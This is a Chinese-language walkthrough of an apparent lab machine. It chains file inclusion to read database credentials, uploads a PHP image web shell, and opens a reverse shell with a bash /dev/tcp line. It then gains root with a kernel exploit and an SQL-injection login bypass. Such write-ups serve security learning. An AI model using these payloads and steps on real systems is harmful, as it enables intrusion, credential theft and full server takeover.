## 一、信息收集

使用nmap或netdiscover扫描确定其ip

![1604148042_5f9d5b4acf60fafa4fdda.png!small?1604148043738](https://image.3001.net/images/20201031/1604148042_5f9d5b4acf60fafa4fdda.png!small?1604148043738)

访问其80端口

![1604148152_5f9d5bb874e648d213046.png!small?1604148154888](https://image.3001.net/images/20201031/1604148152_5f9d5bb874e648d213046.png!small?1604148154888)

发现是一个登入界面，使用御剑后台扫描工具和kali的dirb扫描网站目录

御剑扫描结果：

![1604149880_5f9d627812230c70ec94f.png!small?1604149887878](https://image.3001.net/images/20201031/1604149880_5f9d627812230c70ec94f.png!small?1604149887878)

![1604149955_5f9d62c3ba8ce5a4d0b13.png!small?1604149977045](https://image.3001.net/images/20201031/1604149955_5f9d62c3ba8ce5a4d0b13.png!small?1604149977045)

dirb扫描结果：

![1604149786_5f9d621a4e467f2025137.png!small?1604149802845](https://image.3001.net/images/20201031/1604149786_5f9d621a4e467f2025137.png!small?1604149802845)

![1604149880_5f9d6278390e3a1c057f7.png!small?1604149887887](https://image.3001.net/images/20201031/1604149880_5f9d6278390e3a1c057f7.png!small?1604149887887)

现在收集到的信息有：

<http://192.168.220.143/add.php>文件上传

<http://192.168.220.143/in>/ phpinfo()

[http://192.168.220.143/phpmy](http://192.168.220.143/phpmy/)phpMyAdmin

<http://192.168.220.143/test>文件包含

![1604150058_5f9d632a7e47b8c1b6f51.png!small?1604150059347](https://image.3001.net/images/20201031/1604150058_5f9d632a7e47b8c1b6f51.png!small?1604150059347)

## 二、漏洞利用

### 文件包含

访问192.168.220.143/test.php使用brup抓包

将请求方法改为post![1604151221_5f9d67b5726a09ddc2b6d.png!small?1604151222621](https://image.3001.net/images/20201031/1604151221_5f9d67b5726a09ddc2b6d.png!small?1604151222621)

在Params中加参数file和对应的内容

![1604151291_5f9d67fb6f5977fce8a37.png!small?1604151292453](https://image.3001.net/images/20201031/1604151291_5f9d67fb6f5977fce8a37.png!small?1604151292453)

单包发送，得到对应文件的内容

![1604151325_5f9d681de3ade2d22466a.png!small?1604151326857](https://image.3001.net/images/20201031/1604151325_5f9d681de3ade2d22466a.png!small?1604151326857)

证明该页面存在文件包含漏洞，查看c.php（猜测可能是配置文件）

![1604151184_5f9d6790a1f9c332680bb.png!small](https://image.3001.net/images/20201031/1604151184_5f9d6790a1f9c332680bb.png!small)

得到数据库连接用户名密码，在phpMyAdmin页面使用用户名密码登入

![1604151435_5f9d688b624dcf14ff8ed.png!small?1604151436207](https://image.3001.net/images/20201031/1604151435_5f9d688b624dcf14ff8ed.png!small?1604151436207)

成功登入，得到登入web界面的用户名密码

![1604151586_5f9d6922554ed10a1af64.png!small?1604151587363](https://image.3001.net/images/20201031/1604151586_5f9d6922554ed10a1af64.png!small?1604151587363)

成功登入web界面

![1604151709_5f9d699d9c0ca910682fb.png!small?1604151710713](https://image.3001.net/images/20201031/1604151709_5f9d699d9c0ca910682fb.png!small?1604151710713)

### 文件上传漏洞

选择添加用户，发现可以上传文件，开始上传一句话图片木马

![1604152163_5f9d6b639459a54c0b164.png!small?1604152170658](https://image.3001.net/images/20201031/1604152163_5f9d6b639459a54c0b164.png!small?1604152170658)

访问http://192.168.220.143/panel.php?1=phpinfo(); 使用brup抓包，修改load参数为图片地址

![1604158736_5f9d85100d276e364e7ae.png!small?1604158738203](https://image.3001.net/images/20201031/1604158736_5f9d85100d276e364e7ae.png!small?1604158738203)

### 使用一句话木马反弹shell

发现成功显示了phpinfo() ，说明可以反弹shell

使用brup的编码模块对echo 'bash -i >& /dev/tcp/192.168.220.146/4444 0>&1' | bash进行url编码

注意：ip是kali的ip，端口是监听的端口，要写单引号

![1604159682_5f9d88c287a99b298fdf5.png!small?1604159682700](https://image.3001.net/images/20201031/1604159682_5f9d88c287a99b298fdf5.png!small?1604159682700)

在kali中开启监听

![1604159511_5f9d8817a3c97648afc7c.png!small?1604159511634](https://image.3001.net/images/20201031/1604159511_5f9d8817a3c97648afc7c.png!small?1604159511634)

使用burp构造payload，点击Go访问

注意：url编码的代码要加到system("");里

![1604161424_5f9d8f906968e62715483.png!small?1604161424450](https://image.3001.net/images/20201101/1604161424_5f9d8f906968e62715483.png!small?1604161424450)

成功反弹shell

![1604161445_5f9d8fa53500a5dc00373.png!small?1604161445161](https://image.3001.net/images/20201101/1604161445_5f9d8fa53500a5dc00373.png!small?1604161445161)

## 三、权限提升

查看那个目录有写权限，打算写一个一句话木马

![1604330488_5fa023f8e39293ba7de00.png!small?1604330490858](https://image.3001.net/images/20201102/1604330488_5fa023f8e39293ba7de00.png!small?1604330490858)

进入uploaded_images目录，写木马

![1604331142_5fa02686ec05f010969f5.png!small?1604331144840](https://image.3001.net/images/20201102/1604331142_5fa02686ec05f010969f5.png!small?1604331144840)

拿到webshell，查看系统和内核版本

![1604331207_5fa026c78039afd35e4ba.png!small?1604331209315](https://image.3001.net/images/20201102/1604331207_5fa026c78039afd35e4ba.png!small?1604331209315)

### ubuntu 12.04 --> 37293.c提权

使用kali的searchsploit命令搜索提权代码，使用37292.c提权，下载文件到kali

![1604331498_5fa027ea7d5d767533330.png!small?1604331500378](https://image.3001.net/images/20201102/1604331498_5fa027ea7d5d767533330.png!small?1604331500378)

然后拷贝到真机，绕后通过菜刀上传到目标机器![1604331566_5fa0282edf89c646e647e.png!small?1604331568726](https://image.3001.net/images/20201102/1604331566_5fa0282edf89c646e647e.png!small?1604331568726)

编译提权文件  
![1604331685_5fa028a5db1f7bfc9b4f3.png!small?1604331687756](https://image.3001.net/images/20201102/1604331685_5fa028a5db1f7bfc9b4f3.png!small?1604331687756)

执行编译后的执行文件，成功提权到root权限

![1604331697_5fa028b1a468199a3b301.png!small?1604331699496](https://image.3001.net/images/20201102/1604331697_5fa028b1a468199a3b301.png!small?1604331699496)

## 其他思路：

### 一、走ssh

爆破phpmy目录下的文件

![1604333118_5fa02e3ed5288c23a113e.png!small?1604333120725](https://image.3001.net/images/20201103/1604333118_5fa02e3ed5288c23a113e.png!small?1604333120725)

使用文件包含漏洞，查看config.inc.php文件内容

![1604333643_5fa0304b0ebcd31311c0d.png!small?1604333644986](https://image.3001.net/images/20201103/1604333643_5fa0304b0ebcd31311c0d.png!small?1604333644986)

可以看到账号密码，直接使用此账号密码ssh连接目标主机，拿到root权限

![1604333733_5fa030a584561224a1c9b.png!small?1604333735474](https://image.3001.net/images/20201103/1604333733_5fa030a584561224a1c9b.png!small?1604333735474)

### 二、sql注入登入网站

使用文件包含漏洞查看index.php源码，分析其过滤规则，然后构造payload绕过

![1604339284_5fa04654bd3a2f4e6f1b1.png!small?1604339286619](https://image.3001.net/images/20201103/1604339284_5fa04654bd3a2f4e6f1b1.png!small?1604339286619)

最后测试出uname=or 1=1# pass=\ 能成功登入

加 \ 号是为了让后面的unmae逃逸出来，使用此payload的后的sql语句：

select * from auth where pass='\' and uname=' or 1=1#'

